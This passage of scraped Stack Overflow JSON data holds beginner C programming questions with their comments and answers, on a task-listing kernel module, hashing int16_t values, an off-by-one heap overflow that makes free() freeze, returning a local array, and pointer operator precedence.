kernel module program to list tasks linearly, such that if you run the command <code>ps -el</code> should have the same or similar output. my textbook says:\n&quot;In the Linux kernel, the <code>for_each_process()</code> macro easily allows iteration over all current tasks in the system:</p>\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;linux/sched.h&gt;\n\nstruct task_struct *task;\n\nfor_each_process(task) {\n   /* on each iteration task points to the next task */\n}\n</code></pre>\n<p>so I have the following:</p>\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;linux/init.h&gt;\n#include &lt;linux/kernel.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;linux/sched.h&gt;\n\n\nint tasks_lister_linear_init(void)\n{\n  printk(KERN_INFO &quot;Loading module...\\n&quot;);\n\n  struct task_struct *task;\n\n  for_each_process(task)\n  {\n    printk(KERN_INFO &quot;pid: %d | pname: %s | state: %ld\\n&quot;, task-&gt;pid, task- \n   &gt;comm, task-&gt;state);\n  }\n\n  printk(KERN_INFO &quot;Module loaded.\\n&quot;);\n  return 0;\n}\n\nvoid tasks_lister_linear_exit(void)\n{\n  printk(KERN_INFO &quot;Module removed.\\n&quot;);\n}\n\nmodule_init(tasks_lister_linear_init);\nmodule_exit(tasks_lister_linear_exit);\n</code></pre>\n<p>and when I go to make, I get an error saying</p>\n<pre><code>implicit declaration of function \u2018for_each_process\u2019; did you mean \u2018for_each_node\u2019?\n\nexpected \u2018;\u2019 before \u2018{\u2019 token\n      |     for_each_process(task) {\n      |                           ^~\n      |                           ;\n</code></pre>\n<p>yet every call to this I have seen has not had a semicolon following. any advice on these errors would be greatly appreciated</p>\n"}, {"tags": ["c", "hash", "hash-function", "signed-integer"], "comments": [{"owner": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "edited": false, "score": 1, "creation_date": 1544634699, "post_id": 53748067, "comment_id": 94348534, "body": "Losslessness is not usually a criterion for hash functions (which are generally lossy, i.e. one-way where it is not possible to recover the original value). Can you explain what you&#39;re trying to accomplish and what the value is being used for so we can understand the design goals?"}, {"owner": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "edited": false, "score": 3, "creation_date": 1544634812, "post_id": 53748067, "comment_id": 94348588, "body": "There&#39;s also no point I can see in taking <code>key</code> as a <code>const void *</code> rather than a strongly typed <code>const int16_t *</code>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user8298902"}, "reply_to_user": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "edited": false, "score": 0, "creation_date": 1544634924, "post_id": 53748067, "comment_id": 94348644, "body": "Sorry, I forgot to mention that the key can also be of other types, like a generic key, value mapping."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544635392, "post_id": 53748067, "comment_id": 94348941, "body": "1) Post an example of how you call <code>hash_int16_t()</code>  2) Why call it <code>hash_int16_t</code> is it for &quot;a generic hash table&quot;?"}], "answers": [{"tags": [], "owner": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "is_accepted": true, "score": 0, "last_activity_date": 1544637283, "last_edit_date": 1544637283, "creation_date": 1544636387, "answer_id": 53748519, "question_id": 53748067, "link": "https://stackoverflow.com/questions/53748067/hashing-int16-t-to-uint64-t/53748519#53748519", "title": "Hashing int16_t to uint64_t", "body": "<blockquote>\n  <p>Is there a hash function for signed types?</p>\n</blockquote>\n\n<p>Sure. A good hash function that works on unsigned types can also work just fine on signed types. If the hash function is good, then it has good <a href=\"https://en.wikipedia.org/wiki/Hash_function#Uniformity\" rel=\"nofollow noreferrer\">uniformity</a>, and so it doesn't matter whether you call a particular bit a \"sign bit\" or \"just another bit.\" For the purposes of this answer, I'll take it as given that the algorithm you found in the linked thread is \"good.\"</p>\n\n<blockquote>\n  <p>Should I mix the bits using 16 bit unsigned integers or 64 bit unsigned integers will do fine?</p>\n</blockquote>\n\n<p>You can't rely on bit-shift operators to promote the result of shifting a <code>uint16_t</code> to a <code>uint64_t</code>, so you must work with <code>uint64_t</code> as in the code you posted.</p>\n\n<blockquote>\n  <p>Will I be loosing information when I cast it to an unsigned type if the integer is negative?</p>\n</blockquote>\n\n<p>No, because each possible value of an <code>int16_t</code> maps to a distinct value when converted to a <code>uint64_t</code>: the range [0, 32767] maps to [0, 32767] and the range [-32768, -1] maps to [18446744073709518848, 18446744073709551615] (see below for explanation).</p>\n\n<blockquote>\n  <p>Will this generate undefined behavior?</p>\n</blockquote>\n\n<p>No. The C standard (C11) specifies the following for signed-to-unsigned integer conversion (\u00a76.3.1.3):</p>\n\n<blockquote>\n  <p>[...] if the new type is unsigned, the value is converted by repeatedly adding or subtracting one more than the maximum value that can be represented in the new type until the value is in the range of the new type.</p>\n</blockquote>\n\n<p>Thus, -32768 converts to -32768 + 2<sup>64</sup> = 18446744073709518848, and -1 converts to -1 + 2<sup>64</sup> = 18446744073709551615.</p>\n\n<hr>\n\n<p>As for the algorithm itself... if the hash value is only being used to create a hash table, then it isn't necessary for the hash function to have any <em>cryptographic</em> properties like dispersion. As such, this trivial algorithm might work just fine for an <code>int16_t x</code>:</p>\n\n<pre><code>return (uint64_t) x;\n</code></pre>\n\n<p>This function has no dispersion, but (trivially) optimal uniformity for the input and output range. Whether this is acceptable will depend on the hash table implementation. If it naively uses only certain bits of the hash value to select a bin to place the value in, and it doesn't do any mixing of its own, you'll need to focus the uniformity of your output on those bits, wherever/whichever they are.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8298902"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 218, "favorite_count": 0, "closed_date": 1544656015, "accepted_answer_id": 53748519, "answer_count": 1, "score": 0, "last_activity_date": 1544637283, "creation_date": 1544634581, "last_edit_date": 1544635090, "question_id": 53748067, "link": "https://stackoverflow.com/questions/53748067/hashing-int16-t-to-uint64-t", "closed_reason": "Needs details or clarity", "title": "Hashing int16_t to uint64_t", "body": "<p>I'm trying to make a hash function for <code>int16_t</code>. The function prototype looks like this:</p>\n\n<pre><code>uint64_t hash_int16_t(const void *key);\n</code></pre>\n\n<p>So far I've gotten this but I don't know if this is the correct approach:</p>\n\n<pre><code>uint64_t hash_int16_t(const void *key)\n{\n    // key is expected to be an int16_t\n    const int16_t *e = (const int16_t*)key;\n\n    uint64_t x = (uint64_t)*e;\n\n    x = (x ^ (x &gt;&gt; 30)) * UINT64_C(0xbf58476d1ce4e5b9);\n    x = (x ^ (x &gt;&gt; 27)) * UINT64_C(0x94d049bb133111eb);\n    x = x ^ (x &gt;&gt; 31);\n\n    return x;\n}\n</code></pre>\n\n<p>Is there a hash function for signed types? Should I mix the bits using 16 bit unsigned integers or 64 bit unsigned integers will do fine? Will I be loosing information when I cast it to an unsigned type if the integer is negative? Will this generate undefined behavior?</p>\n\n<p>P.S. The code is in C and I've taken the hash function from <a href=\"https://stackoverflow.com/a/12996028/8298902\">here</a>.</p>\n\n<p>Edit 1: The argument is <code>const void *key</code> because the user is allowed to store keys as other values like structs or strings. The above function will add support to <code>int16_t</code> keys.</p>\n\n<p>Edit 2: What I'm trying to accomplish is a generic hash table. The user will have to provide a hash function when initializing the hash table and the example above is bundled with the hash table.</p>\n"}, {"tags": ["c", "visual-c++"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 2, "creation_date": 1544634297, "post_id": 53747928, "comment_id": 94348339, "body": "the code of the function would be a plus to know if it allocates something or not..."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 2, "creation_date": 1544634301, "post_id": 53747928, "comment_id": 94348341, "body": "Are we supposed to <i>guess</i> what nefarious things are going on inside of <code>xorshift32</code> ?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1544634362, "post_id": 53747928, "comment_id": 94348369, "body": "Does <code>xorshift32</code> actually allocate memory with <code>malloc()</code>?"}, {"owner": {"reputation": 105, "user_id": 10782054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d2fd8d5a9a46a745db3719cd4a8b44f?s=128&d=identicon&r=PG&f=1", "display_name": "MihaiM", "link": "https://stackoverflow.com/users/10782054/mihaim"}, "edited": false, "score": 0, "creation_date": 1544634459, "post_id": 53747928, "comment_id": 94348411, "body": "Sorry, I added the function code to my quesiton"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1544634745, "post_id": 53747928, "comment_id": 94348559, "body": "you don&#39;t need to cast values. Destination types are already what you want. <code>v[k] = (unsigned int) r;</code> =&gt; <code>v[k] = r;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 105, "user_id": 10782054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d2fd8d5a9a46a745db3719cd4a8b44f?s=128&d=identicon&r=PG&f=1", "display_name": "MihaiM", "link": "https://stackoverflow.com/users/10782054/mihaim"}, "edited": false, "score": 0, "creation_date": 1544634795, "post_id": 53748040, "comment_id": 94348578, "body": "That was it, now it works. Thanks. I thought that was something with the compiler since in visual-c++ compiler it freezes and in gcc compiler it works."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 105, "user_id": 10782054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d2fd8d5a9a46a745db3719cd4a8b44f?s=128&d=identicon&r=PG&f=1", "display_name": "MihaiM", "link": "https://stackoverflow.com/users/10782054/mihaim"}, "edited": false, "score": 0, "creation_date": 1544634865, "post_id": 53748040, "comment_id": 94348609, "body": "undefined behaviour, as I said. The compiler is generally bug-free for simple uses like that."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "reply_to_user": {"reputation": 105, "user_id": 10782054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d2fd8d5a9a46a745db3719cd4a8b44f?s=128&d=identicon&r=PG&f=1", "display_name": "MihaiM", "link": "https://stackoverflow.com/users/10782054/mihaim"}, "edited": false, "score": 0, "creation_date": 1544635181, "post_id": 53748040, "comment_id": 94348802, "body": "@MihaiM another option is to change your loop to <code>for(k = 0; k&lt;size;k++)</code>, and in fact if you want <code>size</code> items as the variable name suggests, I suspect this is what you want. Array indices are 0-based in C, might as well get used to it. An array with <code>size</code> elements is indexed from 0 to <code>size-1</code>. Allocating an extra space and looping from 1 to <code>&lt;= arraySize</code> is not commonly done."}, {"owner": {"reputation": 105, "user_id": 10782054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d2fd8d5a9a46a745db3719cd4a8b44f?s=128&d=identicon&r=PG&f=1", "display_name": "MihaiM", "link": "https://stackoverflow.com/users/10782054/mihaim"}, "reply_to_user": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 2, "creation_date": 1544635275, "post_id": 53748040, "comment_id": 94348863, "body": "@yano I use v[0] to store my seed for the  pseudorandom numbers"}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "reply_to_user": {"reputation": 105, "user_id": 10782054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d2fd8d5a9a46a745db3719cd4a8b44f?s=128&d=identicon&r=PG&f=1", "display_name": "MihaiM", "link": "https://stackoverflow.com/users/10782054/mihaim"}, "edited": false, "score": 0, "creation_date": 1544635312, "post_id": 53748040, "comment_id": 94348893, "body": "@MihaiM Ahhh, right you are. My apologies, I didn&#39;t look carefully."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 1, "creation_date": 1544635318, "post_id": 53748040, "comment_id": 94348899, "body": "@yano: OP puts the seed in the array first. Then the elements. So there&#39;s the size of the elements, plus one. Else my answer would be wrong."}], "tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": true, "score": 2, "last_activity_date": 1544635003, "last_edit_date": 1544635003, "creation_date": 1544634490, "answer_id": 53748040, "question_id": 53747928, "link": "https://stackoverflow.com/questions/53747928/free-freezing-in-visual-studio-c/53748040#53748040", "title": "free() freezing in visual studio C", "body": "<pre><code>for(k = 1; k&lt;=size;k++)\n</code></pre>\n\n<p>The memory you allocated is valid until index <code>size - 1</code>, but <code>k</code> can go up to <code>size</code>; so when writing to <code>v{size]</code> you trigger a memory corruption.</p>\n\n<p>What follows is <em>undefined behaviour</em>, and it shows when freeing the buffer (but it could have done something else, even if in those cases, either it crashes right at the line where you're overwriting the memory, or at the next memory operation <code>free</code> or <code>malloc</code>, because of memory list corruption.)</p>\n\n<p>Personally I tend to avoid conditions with an inferior or equal test (<code>k&lt;=size;</code>) in <code>for</code> loops because one-off errors are easy. It's better to compute a variable called <code>size_plus_one</code> and use <code>k &lt; size_plus_one</code>.</p>\n\n<p>Alloc one more element to fix this:</p>\n\n<pre><code>unsigned int* v = calloc(size + 1, sizeof(int));\n</code></pre>\n"}], "owner": {"reputation": 105, "user_id": 10782054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d2fd8d5a9a46a745db3719cd4a8b44f?s=128&d=identicon&r=PG&f=1", "display_name": "MihaiM", "link": "https://stackoverflow.com/users/10782054/mihaim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "accepted_answer_id": 53748040, "answer_count": 1, "score": 0, "last_activity_date": 1544635003, "creation_date": 1544634087, "last_edit_date": 1544634428, "question_id": 53747928, "link": "https://stackoverflow.com/questions/53747928/free-freezing-in-visual-studio-c", "title": "free() freezing in visual studio C", "body": "<p>I have a problem with the function free() in visual studio. When I call the function free() to free  the memory that I used the visual studio console freezes. I tried to compile the same code  with gcc compilator and it works just fine.</p>\n\n<p>Here is a sample from my code (the language is C ): </p>\n\n<p>function xorshift32: </p>\n\n<pre><code>  unsigned int* xorshift32(int size, int seed);\n{\n    unsigned int r, k;\n    r = (unsigned int) seed;\n    unsigned int* v = calloc(size, sizeof(int));\n    v[0] = seed;\n    for(k = 1; k&lt;=size;k++)\n{\n        r = r ^ r &lt;&lt; 13; \n        r = r ^ r &gt;&gt; 17;\n        r = r ^ r &lt;&lt; 5;\n        v[k] = (unsigned int) r;\n}\n    return v;\n}\n</code></pre>\n\n<p>the call of the function and free function:</p>\n\n<pre><code>    unsigned int *random_sequence;\n    random_sequence = xorshift32(rand_size, seed);\n    free(random_sequence);\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 1, "creation_date": 1544632344, "post_id": 53747378, "comment_id": 94347282, "body": "If <code>cmd</code> is not declared with the <code>static</code> qualifier, trying to access the returned value from <code>readCommand</code> will be undefined behavior"}, {"owner": {"reputation": 181, "user_id": 7935361, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6e33272819709625f8b4b4de872a6f6?s=128&d=identicon&r=PG&f=1", "display_name": "Leonid Zolotarov", "link": "https://stackoverflow.com/users/7935361/leonid-zolotarov"}, "reply_to_user": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 0, "creation_date": 1544632482, "post_id": 53747378, "comment_id": 94347357, "body": "@GovindParmar i tried &#39;static char cmd[256];&#39; bu the result the same. What I did wrong? Thank you!"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1544632736, "post_id": 53747378, "comment_id": 94347514, "body": "@LeonidZolotarov The error comes from <code>*cmd = readCommand();</code> instead of <code>cmd = readCommand();</code>, but you&#39;re doing it wrong anyway, read the duplicates."}], "owner": {"reputation": 181, "user_id": 7935361, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6e33272819709625f8b4b4de872a6f6?s=128&d=identicon&r=PG&f=1", "display_name": "Leonid Zolotarov", "link": "https://stackoverflow.com/users/7935361/leonid-zolotarov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 48, "favorite_count": 0, "closed_date": 1544632525, "answer_count": 0, "score": 0, "last_activity_date": 1544632677, "creation_date": 1544632221, "last_edit_date": 1544632677, "question_id": 53747378, "link": "https://stackoverflow.com/questions/53747378/c-function-returns-string-as-char-array", "closed_reason": "Duplicate", "title": "C : function, returns string as char array", "body": "<p>I try to create a function, which returns astring (char array);</p>\n\n<p>I tried different ways,  but I always got error like:</p>\n\n<blockquote>\n  <p>[Error] conflicting types for 'readCommand'</p>\n</blockquote>\n\n<p>Code:</p>\n\n<pre><code>char* cmd; //char cmd[256]\n*cmd = readCommand();\n\n//function\nchar* readCommand()\n{\n    char cmd[256];\n    fgets(cmd, sizeof(cmd), stdin);\n    return cmd;\n}\n</code></pre>\n\n<p>How can I return a string from this function?</p>\n"}, {"tags": ["c", "function", "struct", "structure", "function-pointers"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1544632089, "post_id": 53747225, "comment_id": 94347151, "body": "The 4 expressions with an error are meaningless, therefore they don&#39;t do anything."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1544632264, "post_id": 53747225, "comment_id": 94347234, "body": "Hints: <code>++p-&gt;i</code> is the same as <code>++(p-&gt;i)</code> and <code>p++-&gt;i</code> is the same as <code>(p++)-&gt;i</code>."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1544632437, "post_id": 53747225, "comment_id": 94347334, "body": "Other hint: put <code>printf(&quot;p = %p\\n&quot;, p);</code> before and after thge two remaining printfs in coude code. It prints the <i>value</i> of the <code>p</code> pointer."}, {"owner": {"reputation": 172, "user_id": 8715880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9a394c69c8162ab05d1652f5fa13fa0?s=128&d=identicon&r=PG", "display_name": "rjgupta21", "link": "https://stackoverflow.com/users/8715880/rjgupta21"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1544632771, "post_id": 53747225, "comment_id": 94347540, "body": "Got that. But does it still mean that <code>*p-&gt;i</code>, <code>*p-&gt;i++</code>, <code>(*p-&gt;i)++</code>, and <code>*p++-&gt;i</code> do nothing and are not useful at all. Or in a simple context, it is the wrong syntax?"}, {"owner": {"reputation": 172, "user_id": 8715880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9a394c69c8162ab05d1652f5fa13fa0?s=128&d=identicon&r=PG", "display_name": "rjgupta21", "link": "https://stackoverflow.com/users/8715880/rjgupta21"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1544632977, "post_id": 53747225, "comment_id": 94347645, "body": "@jabberwocky also in your second comment you&#39;re saying that <code>p++-&gt;i</code> is same as <code>(p++-&gt;i)</code> but I don&#39;t have a <code>(p++-&gt;i)</code> but  a <code>*p++-&gt;i</code> and <code>(*p-&gt;i++)</code> . Does that makes sense, I&#39;m getting confused now."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1544632984, "post_id": 53747225, "comment_id": 94347655, "body": "The syntax is simply wrong, and expressions with wrong syntax are meaningless."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1544633057, "post_id": 53747225, "comment_id": 94347712, "body": "Read my second comment carefully. I never mentioned <code>(p++-&gt;i)</code>."}, {"owner": {"reputation": 3691, "user_id": 1808989, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/3884a2f2ee43a4681967493905dcc20c?s=128&d=identicon&r=PG", "display_name": "Andrew Sun", "link": "https://stackoverflow.com/users/1808989/andrew-sun"}, "edited": false, "score": 0, "creation_date": 1544633824, "post_id": 53747225, "comment_id": 94348127, "body": "I&#39;d say the syntax is correct, it&#39;s the type checker that fails."}, {"owner": {"reputation": 172, "user_id": 8715880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9a394c69c8162ab05d1652f5fa13fa0?s=128&d=identicon&r=PG", "display_name": "rjgupta21", "link": "https://stackoverflow.com/users/8715880/rjgupta21"}, "reply_to_user": {"reputation": 3691, "user_id": 1808989, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/3884a2f2ee43a4681967493905dcc20c?s=128&d=identicon&r=PG", "display_name": "Andrew Sun", "link": "https://stackoverflow.com/users/1808989/andrew-sun"}, "edited": false, "score": 0, "creation_date": 1544634029, "post_id": 53747225, "comment_id": 94348212, "body": "@AndrewSun still that means that the statements are not useful."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1544634328, "post_id": 53747225, "comment_id": 94348354, "body": "@RajatGupta statements that do not compile for whatever reason are useless by definition."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1544758747, "post_id": 53747225, "comment_id": 94397972, "body": "in general, you need to pay attention to the meaning of a pre or post increment and to the precedence of the C operators"}], "answers": [{"comments": [{"owner": {"reputation": 172, "user_id": 8715880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9a394c69c8162ab05d1652f5fa13fa0?s=128&d=identicon&r=PG", "display_name": "rjgupta21", "link": "https://stackoverflow.com/users/8715880/rjgupta21"}, "edited": false, "score": 0, "creation_date": 1544633426, "post_id": 53747666, "comment_id": 94347915, "body": "When I ran this code on my machine, it prints <code>NAME: 21</code> and &#39;NUMBER: 21&#39; though."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1544633673, "post_id": 53747666, "comment_id": 94348055, "body": "Are you sure <code>(p++)-&gt;i</code> is UB?"}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 172, "user_id": 8715880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9a394c69c8162ab05d1652f5fa13fa0?s=128&d=identicon&r=PG", "display_name": "rjgupta21", "link": "https://stackoverflow.com/users/8715880/rjgupta21"}, "edited": false, "score": 1, "creation_date": 1544633676, "post_id": 53747666, "comment_id": 94348056, "body": "@RajatGupta - undefined behavior can result in the second statement doing the unexpected."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1544633731, "post_id": 53747666, "comment_id": 94348078, "body": "@Jabberwocky - If I am interpreting it correctly, is it not changing the address of the pointer?  In which case, the struct variable is not valid.  Printing that location would result in some indeterminate value."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": 